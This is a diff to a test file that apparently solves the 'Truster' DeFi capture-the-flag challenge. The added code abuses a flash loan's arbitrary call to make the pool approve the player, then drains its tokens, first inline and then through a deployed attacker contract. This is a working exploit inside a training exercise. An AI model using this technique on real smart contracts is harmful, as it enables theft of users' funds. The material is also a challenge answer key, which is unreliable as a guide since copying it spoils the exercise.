@@ -23,6 +23,23 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // version 1.0.0
+        // const iface = new ethers.utils.Interface([
+        //     "function approve(address spender, uint256 amount) public returns (bool)"
+        // ])
+        // const amount = ethers.utils.parseUnits("1000000000000000000000000", 0)
+        // let data = iface.encodeFunctionData("approve", [player.address, amount])
+        // console.log(data)
+        // await pool.flashLoan(0, pool.address, token.address, data);
+        // token = token.connect(player);
+        // console.log("allowance[pool][player]", (await token.allowance(pool.address, player.address)).toString())
+        // await token.transferFrom(pool.address, player.address, amount)
+        // console.log("balanceOf[player]", (await token.balanceOf(player.address)).toString())
+
+        // version 2.0.0
+        const Attacker = await ethers.getContractFactory('Attacker3', player);
+        attacker = await Attacker.deploy();
+        await attacker.attack(pool.address, token.address, player.address);
     });
 
     after(async function () {
